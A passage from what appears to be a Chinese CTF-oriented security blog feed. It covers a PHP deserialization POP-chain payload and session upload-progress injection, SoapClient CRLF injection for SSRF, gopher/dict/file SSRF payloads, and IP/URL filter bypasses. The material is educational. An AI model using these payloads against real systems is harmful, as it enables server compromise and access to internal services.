language_">$this</span>-&gt;daniu;<br>            <span class="hljs-variable language_">$this</span>-&gt;daniu=<span class="hljs-variable language_">$this</span>-&gt;robot;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;daniu;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable">$robot</span>=<span class="hljs-variable language_">$this</span>-&gt;robot;<br>            <span class="hljs-variable language_">$this</span>-&gt;daniu-&gt;<span class="hljs-variable">$robot</span>=<span class="hljs-variable language_">$this</span>-&gt;notrobot;<br>            <span class="hljs-keyword">return</span> (<span class="hljs-keyword">string</span>)<span class="hljs-variable language_">$this</span>-&gt;daniu;<br><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>               <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;daniu.<span class="hljs-variable">$key</span>.<span class="hljs-string">&quot;not exists!!!&quot;</span>;<br>        &#125;<br><br> &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Year</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$zodiac</span>;<br>         <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;happy &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;zodiac.<span class="hljs-string">&quot; year!&quot;</span>;<br><br>        &#125;<br>         <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;zodiac=<span class="hljs-string">&quot;Hu&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">show</span>();<br><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>,<span class="hljs-variable">$value</span></span>)#3</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;zodiac));<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;zodiac = <span class="hljs-string">&#x27;hu&#x27;</span>;<br>        &#125;<br><br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>先构造pop链<br><code>O:5:&quot;Happy&quot;:1:&#123;s:5:&quot;happy&quot;;O:5:&quot;_New_&quot;:3:&#123;s:5:&quot;daniu&quot;;O:5:&quot;_New_&quot;:3:&#123;s:5:&quot;daniu&quot;;O:4:&quot;Year&quot;:1:&#123;s:6:&quot;zodiac&quot;;N;&#125;s:5:&quot;robot&quot;;s:6:&quot;zodiac&quot;;s:8:&quot;notrobot&quot;;s:5:&quot;/f1ag&quot;;&#125;s:5:&quot;robot&quot;;N;s:8:&quot;notrobot&quot;;N;&#125;&#125;</code></p>
<p>看下phpinfo中关于session的信息，可以知道当前index.php用的是<code>php</code>引擎，其他页面默认用<code>php_serialize</code>引擎，且<code>session.upload_progress.cleanup=Off</code>，意味着php不会立即清空对应的session文件，就不用进行条件竞争</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-4.png"></p>
<p>构造<code>POST</code>表单，提交传入序列化字符串</p>
<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://dece2f58-5f4b-4bd0-904a-ac58efcf9623.challenges.ctfer.com:8080/&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;lewiserii&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>因为要放到<code>filename</code>中的双引号中，所以这里要转义一下双引号，在拼接上<code>|</code>，注意一定要带上<code>PHPSESSID</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-5.png"></p>
<blockquote>
<p>伪造PHP_SESSION_UPLOAD_PROGRESS的值时，值中一旦出现|，将会导致数据写入session文件失败，所以用filename</p>
</blockquote>
<h1 id="php原生类反序列化"><a href="#php原生类反序列化" class="headerlink" title="php原生类反序列化"></a>php原生类反序列化</h1><p>如果在代码审计中有反序列化点，但在代码中找不到pop链，可以利用php内置类来进行反序列化</p>
<h2 id="SoapClient反序列化与ssrf"><a href="#SoapClient反序列化与ssrf" class="headerlink" title="SoapClient反序列化与ssrf"></a>SoapClient反序列化与ssrf</h2><p>首先需要了解什么是soap<br>soap，是webService三要素(SOAP、WSDL、UDDI)之一</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">SOAP: 基于HTTP协议，采用XML格式，用来描述传递信息的格式。<br><br>WSDL: 用来描述如何访问具体的服务。（相当于说明书）<br><br>UDDI: 用户自己可以按UDDI标准搭建UDDI服务器，用来管理，分发，查询WebService 。其他用户可以自己注册发布WebService调用。（现在基本废弃）<br></code></pre></td></tr></table></figure>

<p>简单来说就是soap是一种基于http的传输协议，可以发起请求来访问远程服务</p>
<p><a href="https://www.php.net/manual/zh/class.soapclient.php">php官方手册</a>中对soapclient的解释如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SoapClient</span> </span>&#123;<br><span class="hljs-comment">/* 属性 */</span><br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$uri</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">int</span> <span class="hljs-variable">$style</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">int</span> <span class="hljs-variable">$use</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$location</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">bool</span> <span class="hljs-variable">$trace</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">int</span> <span class="hljs-variable">$compression</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?resource <span class="hljs-variable">$sdl</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?resource <span class="hljs-variable">$typemap</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?resource <span class="hljs-variable">$httpsocket</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?resource <span class="hljs-variable">$httpurl</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$_login</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$_password</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">bool</span> <span class="hljs-variable">$_use_digest</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$_digest</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$_proxy_host</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">int</span> <span class="hljs-variable">$_proxy_port</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$_proxy_login</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$_proxy_password</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">bool</span> <span class="hljs-variable">$_exceptions</span> = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$_encoding</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">array</span> <span class="hljs-variable">$_classmap</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">int</span> <span class="hljs-variable">$_features</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$_connection_timeout</span>;<br><span class="hljs-keyword">private</span> ?resource <span class="hljs-variable">$_stream_context</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$_user_agent</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">bool</span> <span class="hljs-variable">$_keep_alive</span> = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">int</span> <span class="hljs-variable">$_ssl_method</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$_soap_version</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">int</span> <span class="hljs-variable">$_use_proxy</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">array</span> <span class="hljs-variable">$_cookies</span> = [];<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">array</span> <span class="hljs-variable">$__default_headers</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?SoapFault <span class="hljs-variable">$__soap_fault</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$__last_request</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$__last_response</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$__last_request_headers</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$__last_response_headers</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-comment">/* 方法 */</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__construct</span>(?<span class="hljs-keyword">string</span> <span class="hljs-variable">$wsdl</span>, <span class="hljs-keyword">array</span> <span class="hljs-variable">$options</span> = [])<br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__call</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span>, <span class="hljs-keyword">array</span> <span class="hljs-variable">$args</span>): <span class="hljs-keyword">mixed</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__doRequest</span>(<br>    <span class="hljs-keyword">string</span> <span class="hljs-variable">$request</span>,<br>    <span class="hljs-keyword">string</span> <span class="hljs-variable">$location</span>,<br>    <span class="hljs-keyword">string</span> <span class="hljs-variable">$action</span>,<br>    <span class="hljs-keyword">int</span> <span class="hljs-variable">$version</span>,<br>    <span class="hljs-keyword">bool</span> <span class="hljs-variable">$oneWay</span> = <span class="hljs-literal">false</span><br>): ?<span class="hljs-keyword">string</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getCookies</span>(): <span class="hljs-keyword">array</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getFunctions</span>(): ?<span class="hljs-keyword">array</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getLastRequest</span>(): ?<span class="hljs-keyword">string</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getLastRequestHeaders</span>(): ?<span class="hljs-keyword">string</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getLastResponse</span>(): ?<span class="hljs-keyword">string</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getLastResponseHeaders</span>(): ?<span class="hljs-keyword">string</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getTypes</span>(): ?<span class="hljs-keyword">array</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__setCookie</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span>, ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$value</span> = <span class="hljs-literal">null</span>): <span class="hljs-keyword">void</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__setLocation</span>(?<span class="hljs-keyword">string</span> <span class="hljs-variable">$location</span> = <span class="hljs-literal">null</span>): ?<span class="hljs-keyword">string</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__setSoapHeaders</span>(SoapHeader|<span class="hljs-keyword">array</span>|<span class="hljs-literal">null</span> <span class="hljs-variable">$headers</span> = <span class="hljs-literal">null</span>): <span class="hljs-keyword">bool</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__soapCall</span>(<br>    <span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span>,<br>    <span class="hljs-keyword">array</span> <span class="hljs-variable">$args</span>,<br>    ?<span class="hljs-keyword">array</span> <span class="hljs-variable">$options</span> = <span class="hljs-literal">null</span>,<br>    SoapHeader|<span class="hljs-keyword">array</span>|<span class="hljs-literal">null</span> <span class="hljs-variable">$inputHeaders</span> = <span class="hljs-literal">null</span>,<br>    <span class="hljs-keyword">array</span> &amp;<span class="hljs-variable">$outputHeaders</span> = <span class="hljs-literal">null</span><br>): <span class="hljs-keyword">mixed</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>先从手册中看soap的构造方法，可以看到有两个参数，第一个参数<code>$wsdl</code>用来指明是否为wsdl模式，第二个参数<code>$options</code>是一个数组。<br>当在第一个参数中指明了wsdl模式后，第二个参数是可选的，可以没有；当第一个参数设置为非wsdl模式后，第二个参数中必须设置uri和location选项。location就是目标url，uri是soap服务的命令空间</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-6.png"></p>
<p>再看__call()方法，当调用类中不存在的方法时就会触发，当触发这个方法后，它就会向location中的目标URL发送一个soap请求</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;aaa&#x27;</span>,<span class="hljs-string">&#x27;location&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://20.2.129.79:7777&#x27;</span>));<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">a</span>();<br></code></pre></td></tr></table></figure>

<p>在vps上监听对应的端口</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-7.png"></p>
<p>可以接收到一个post请求，并且<code>SOAPAction</code>的值明显是可控的，那么利用crlf我们就能控制数据包了</p>
<p>比如插入一个cookie</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;aaa^^Cookie: test=123^^&#x27;</span>,<span class="hljs-string">&#x27;location&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://20.2.129.79:7777&#x27;</span>));<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-string">&quot;\r\n&quot;</span>,<span class="hljs-variable">$b</span>);<br><br><span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">a</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-8.png"></p>
<p>但是对于POST数据包，还存在一个问题，即Content-Type的值，默认是text&#x2F;xml，我们修改的SOAPAction在Content-Type的下面，无法控制Content-Type，也就不能控制POST的数据</p>
<p>在header里User-Agent在Content-Type前面，手册中也提到了如何设置User-Agent，我们可以在User-Agent中注入crlf，从而控制Content-Type的值</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-9.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$post_data</span> = <span class="hljs-string">&quot;data=abc&quot;</span>;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;user_agent&#x27;</span>=&gt;<span class="hljs-string">&#x27;Mozilla/5.0^^Content-Type: application/x-www-form-urlencoded^^Content-Length: &#x27;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post_data</span>).<span class="hljs-string">&#x27;^^^^&#x27;</span>.<span class="hljs-variable">$post_data</span>,<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;aaa&#x27;</span>,<span class="hljs-string">&#x27;location&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://20.2.129.79:7777&#x27;</span>));<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-string">&quot;\r\n&quot;</span>,<span class="hljs-variable">$b</span>);<br><br><span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">a</span>();<br><span class="hljs-comment">//echo urlencode($b);</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>还需要在结尾设置一个Content-Length，一方面对于post包是必须的，另一方面还能让多余的数据丢弃，不影响我们设定的值</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-10.png"></p>
<p>这样就能实现soapclient+crlf组合拳攻击ssrf了</p>
<hr>

<p>参考文章:<br><a href="https://blog.csdn.net/mochu7777777/article/details/106909777">由浅入深理解PHP反序列化漏洞</a><br><a href="https://blog.csdn.net/solitudi/article/details/113588692">[CTF]PHP反序列化总结</a><br><a href="https://spaceman-911.gitee.io/2021/06/30/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E8%B6%85%E7%BB%86%E7%9A%84%EF%BC%89/">PHP-反序列化（超细的）</a></p>
]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>反序列化</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>ssrf学习总结</title>
    <url>/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/ssrf%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93.html</url>
    <content><![CDATA[<h1 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h1><p>服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。</p>
<h1 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h1><p>下面是几个可能会存在SSRF的服务器使用的函数：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">file_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中。<br>readfile()：输出一个文件的内容。<br>fsockopen()：打开一个网络连接或者一个Unix 套接字连接。<br>curl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。<br>fopen()：打开一个文件文件或者 URL。<br></code></pre></td></tr></table></figure>

<p>example:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);  <span class="hljs-comment">//创造一个curl资源</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>); <span class="hljs-comment">//设置url和相应的选项</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>); <span class="hljs-comment">// 抓取url并将其传递给浏览器</span><br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>); <span class="hljs-comment">//关闭curl资源</span><br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<h1 id="常用协议"><a href="#常用协议" class="headerlink" title="常用协议"></a>常用协议</h1><h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p>http协议用于访问内网资源&#x2F;扫描内网存活主机</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ssrf/ssrf-1.png"></p>
<h2 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h2><p>可以通过dict协议根据响应时间和内容去扫描内网开放端口以及端口上运行的服务信息</p>
<p>example:<br><code>dict://127.0.0.1:6379 //探测redis是否存活</code></p>
<h2 id="file"><a href="#file" class="headerlink" title="file"></a>file</h2><p>file协议主要用于访问本地计算机的文件，在有回显的情况下，可以用于读取文件进行查看</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ssrf/ssrf-2.png"></p>
<h2 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h2><p>格式：<code>gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_&lt;TCP数据流&gt;</code></p>
<p>如果发起<code>post</code>请求，回车换行需要使用<code>%0d%0a</code>，如果多个参数，参数之间的<code>&amp;</code>也需要进行<code>URL</code>编码</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ssrf/ssrf-3.png"></p>
<p>通过脚本转换</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br>payload =\<br><span class="hljs-string">&quot;&quot;&quot;POST /test.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Content-Length: 36</span><br><span class="hljs-string"></span><br><span class="hljs-string">test=1</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment">#注意后面一定要有回车，回车结尾表示http请求结束</span><br>tmp = urllib.parse.quote(payload)<br>new = tmp.replace(<span class="hljs-string">&#x27;%0A&#x27;</span>,<span class="hljs-string">&#x27;%0D%0A&#x27;</span>)<br>result = <span class="hljs-string">&#x27;gopher://127.0.0.1:80/&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+new<br>result = urllib.parse.quote(result)<br><span class="hljs-built_in">print</span>(result)       <span class="hljs-comment"># 这里因为是GET请求所以要进行两次url编码</span><br></code></pre></td></tr></table></figure>

<h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><p>攻击内网<code>Redis</code>，<code>FastCGI</code>，<code>MySql</code>等服务</p>
<p><a href="https://xz.aliyun.com/t/5665">浅析Redis中SSRF的利用</a></p>
<p>利用<a href="https://github.com/tarunkant/Gopherus">Gopherus</a>工具</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">MySQL (Port-3306)<br>PostgreSQL(Port-5432)<br>FastCGI (Port-9000)<br>Memcached (Port-11211)<br>    If stored data is getting De-serialized by:<br>        Python<br>        Ruby<br>        PHP<br>Redis (Port-6379)<br>Zabbix (Port-10050)<br>SMTP (Port-25)<br></code></pre></td></tr></table></figure>

<h1 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h1><h2 id="ip限制"><a href="#ip限制" class="headerlink" title="ip限制"></a>ip限制</h2><p>例如限制了<code>127/172</code></p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">进制转换<br>10进制 http://2130706433<br>8进制 http://017700000001<br>16进制  http://0x7F000001<br><br>长度限制<br>host&lt;5<br>url=http://0/flag.php<br>url=http://127.1/flag.php<br><br>host&lt;3<br>url=http://0/flag.php  //在window下代表0.0.0.0，而在liunx下代表127.0.0.1<br></code></pre></td></tr></table></figure>

<h2 id="url限制"><a href="#url限制" class="headerlink" title="url限制"></a>url限制</h2><blockquote>
<p>解析到内网的域名</p>
</blockquote>
<p><code>xip.io</code>、<code>xip.name</code>、<code>nip.io</code>、<code>sslip.io</code>等</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">192.168.0.1.xip.io &gt;&gt;&gt; 192.168.0.1<br>localhost &gt;&gt;&gt; 127.0.0.1<br></code></pre></td></tr></table></figure>

<blockquote>
<p>利用@转跳</p>
</blockquote>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">http://www.baidu.com@10.10.10.10 &gt;&gt;&gt; http://10.10.10.10<br></code></pre></td></tr></table></figure>

<blockquote>
<p>利用句号</p>
</blockquote>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">127。0。0。1  &gt;&gt;&gt;  127.0.0.1<br></code></pre></td></tr></table></figure>

<blockquote>
<p>利用IPv6[::]</p>
</blockquote>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">http://[::]:80/  &gt;&gt;&gt;  http://127.0.0.1<br>http://[0:0:0:0:0:ffff:127.0.0.1]/    //在liunx下可用<br></code></pre></td></tr></table></figure>

<blockquote>
<p>利用短网址</p>
</blockquote>
<p>不允许出现某个字母或者限制了url长度，我们可以切换为短网址，来绕过长度的限制</p>
<h2 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h2><p>vps上放个php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location:http://127.0.0.1/flag.php&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>或者</p>
